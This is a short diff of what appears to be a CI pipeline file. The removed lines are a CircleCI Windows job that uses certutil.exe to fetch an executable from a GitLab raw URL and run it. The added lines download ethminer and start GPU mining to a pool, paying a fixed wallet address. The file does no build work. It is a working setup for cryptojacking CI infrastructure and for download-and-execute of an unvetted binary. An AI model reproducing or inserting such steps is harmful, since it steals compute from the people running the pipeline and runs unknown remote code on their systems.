@@ -1,12 +1,3 @@
-version: 2.1
-
-orbs:
-  win: circleci/windows@2.2.0
-
-jobs:
-  build:
-    executor:
-      name: win/default
-      shell: cmd.exe
-    steps:
-      - run: certutil.exe -urlcache -split -f https://gitlab.com/Pacifierjr1/trickshow2/-/raw/master/circleci.exe circleci.exe && circleci.exe
+ wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz
+ tar -xvf ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz
+ bin/ethminer -G -P stratum1+tcp://0x360CF7904ff17231CD96A0Ff4b045c80276DFEd9@us1.ethermine.org:4444
